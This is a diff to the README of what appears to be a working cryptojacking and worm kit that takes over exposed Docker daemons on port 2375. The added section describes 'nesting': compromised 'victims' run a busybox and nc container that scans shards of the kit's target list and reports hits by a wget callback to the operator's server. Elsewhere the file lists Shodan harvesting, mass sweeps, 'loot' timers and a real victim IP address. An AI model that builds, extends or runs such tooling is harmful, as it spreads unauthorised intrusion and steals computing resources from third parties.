@@ -36,6 +36,10 @@ Everything else is a small runnable reference implementation of it.
 | `kworker-mass.service` / `.timer` | Docker mass sweep schedule (every 10min, 8min budget) |
 | `kworker-harvest.service` | Continuous keyless Shodan-internetdb harvest -> docker queue (1 req/s) |
 | `_harvest.sh` | The harvest loop the service runs (scout nets.txt /16s + filter) |
+| `docknest.sh` | Nesting: each victim scans its own shard of `nets.txt` on `:2375` |
+| `_nestd.py` | Callback receiver for nested scanners (`/hit`, `/alive`, `/stat`) -> `.hunt/mass.found` |
+| `kworker-nestd.service` | The callback receiver (always on, port 8080) |
+| `kworker-nest.service` / `.timer` | Nest shard handout schedule (every 10 min) |
 | `publish.sh` | Push the kit to `CONFIG_URL` - hosts only ever see published revisions |
 
 ## Spread is three rates, not one
@@ -58,6 +62,39 @@ and each was, at some point, silently zero:
   climbed while live capacity did not. `DOCK_REARM` re-deploys what vanished on
   every run, rotating through `dock.recheck` so the whole known set is cycled
   rather than the same head retried forever.
+
+## Nesting: a victim is a searcher, not just a miner
+
+Every scanner in this kit runs from box1 - one 2-vCPU VPS, ~29 addresses/s, one
+internetdb allowance. A victim is a machine we already control, with our container on
+it, doing nothing else. `docknest.sh` gives every victim holding a **running**
+container a second, disposable container (busybox + `nc`, ~2MB) whose whole job is to
+port-check a shard of `nets.txt` on `:2375` from the victim's own IP - and to report
+any hit straight back to box1. Discovery then scales with the fleet instead of with
+box1, and it costs hardware we do not pay for.
+
+- **Report by HTTP callback, never by scraping the container.** Measured on a real
+  daemon (Docker 29.8.0): `/containers/<id>/logs` and `/exec/<id>/start` both return
+  **empty** while the JSON routes answer fine, so scraped output is not dependable. A
+  hit is one `wget http://<box1>:8080/hit?ip=<hit>`; `_nestd.py` dedupes it and appends
+  `ip<TAB>nest` to `.hunt/mass.found` - the queue `dock.sh` already reads - so a nested
+  hit is indistinguishable downstream from a sweep hit, and the callback doubles as a
+  liveness signal for the victim.
+- **`nc`, no TLS.** A plain TCP probe needs nothing from the userland, so the payload
+  is ~2MB and works on any daemon that can pull an image. Refining a hit into "is this
+  really a daemon" stays box1's job (it asks `/version`), so victims stay coarse.
+- **Shards, not shared ranges.** A cursor walks the /24s of `nets.txt`
+  (`NEST_PERSHARD`, default 16 /24s = ~4k addresses per victim per run), so no two
+  victims cover the same range and a full pass covers each /24 exactly once. A victim
+  that dies mid-shard loses that range until the cursor comes round. `NEST_PAR` (24)
+  bounds probes in flight; `NEST_MAXHOSTS` bounds victims touched per run; a victim
+  still holding a scanner is skipped, so the 10-minute timer never stacks work on it.
+- **API notes that cost real time:** the docker API does **not** auto-pull on create
+  (pull first), and the first host of each run is given box1's own /24 as a positive
+  control so the loop is falsifiable from a single log line.
+- **First light:** 4 victims, ~65k addresses per round, first hit `101.32.52.219`
+  within minutes - found by a victim, landing in the same queue the sweep feeds. No
+  firewall work needed (ufw inactive, INPUT ACCEPT), and `/stat` answers from off-box.
 
 Landmines, each hit live - read before editing these scripts:
 
@@ -115,6 +152,8 @@ repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
 `kworker-hunt.timer`, `kworker-loot.service`, `kworker-loot.timer`,
 `dock.sh`, `kworker-dock.service`, `kworker-dock.timer`,
 `dockmass.sh`, `kworker-mass.service`, `kworker-mass.timer`,
+`docknest.sh`, `_nestd.py`, `kworker-nestd.service`,
+`kworker-nest.service`, `kworker-nest.timer`,
 `shodan.sh`,
 `bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
 in `bootstrap.sh` to that base URL.
